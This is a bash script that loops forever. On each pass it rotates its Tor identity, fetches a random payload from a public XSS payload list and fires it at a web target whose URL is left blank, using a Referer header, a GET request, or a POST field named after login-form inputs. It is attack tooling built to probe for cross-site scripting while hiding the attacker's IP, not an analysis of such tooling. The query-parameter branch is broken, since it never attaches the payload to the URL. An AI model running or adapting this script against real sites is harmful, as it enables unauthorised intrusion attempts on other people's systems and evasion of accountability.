#!/bin/bash

# Enable strict error handling
set -e

# Function to log messages with timestamp
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

log "Starting the script..."

# Infinite loop to keep the script running
while true; do
    log "Requesting a new Tor identity..."
    echo -e "authenticate \"\"\nsignal newnym\nquit" | nc localhost 9051
    sleep 2  # Wait for Tor to switch to a new IP
    log "New Tor identity set."

    # Print the new public IP
    PUBLIC_IP=$(curl --socks5 127.0.0.1:9050 -s http://checkip.amazonaws.com/)
    log "New public IP: $PUBLIC_IP"

    # Fetch XSS payload list and select a random payload
    URL="https://raw.githubusercontent.com/payloadbox/xss-payload-list/refs/heads/master/Intruder/xss-payload-list.txt"
    log "Fetching XSS payload list from $URL..."
    PAYLOAD=$(curl -s "$URL" | shuf -n 1)

    # URL encode the payload
    ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
    log "Selected random XSS payload: $PAYLOAD"
    log "URL-encoded payload: $ENCODED_PAYLOAD"

    # Randomly choose between GET, POST, or adding payload to a header
    REQUEST_TYPE=$((RANDOM % 3))

    if [[ $REQUEST_TYPE -eq 0 ]]; then
        # Perform GET request with payload in Referer header
        TARGET_URL=""
        log "Sending GET request to: $TARGET_URL with Referer: $ENCODED_PAYLOAD"
        RESPONSE=$(curl --socks5 127.0.0.1:9050 -s -w "%{http_code}" -H "Referer: $ENCODED_PAYLOAD" "$TARGET_URL" > /dev/null)
    elif [[ $REQUEST_TYPE -eq 1 ]]; then
        # Perform GET request with payload in the query parameter
        TARGET_URL=""
        log "Sending GET request to: $TARGET_URL"
        RESPONSE=$(curl --socks5 127.0.0.1:9050 -s -w "%{http_code}" "$TARGET_URL" > /dev/null)
    else
        # Perform POST request with payload in a random field
        TARGET_URL=""
        PARAMS=("uid" "passw" "btnSubmit")
        RANDOM_PARAM=${PARAMS[$RANDOM % ${#PARAMS[@]}]}
        POST_DATA="$RANDOM_PARAM=$ENCODED_PAYLOAD"
        log "Sending POST request to: $TARGET_URL with $RANDOM_PARAM=$ENCODED_PAYLOAD"
        RESPONSE=$(curl --socks5 127.0.0.1:9050 -s -w "%{http_code}" -X POST -d "$POST_DATA" "$TARGET_URL" > /dev/null)
    fi

    # Log the response status
    log "Response status: $RESPONSE"

    # Wait before the next iteration
    sleep 2

done
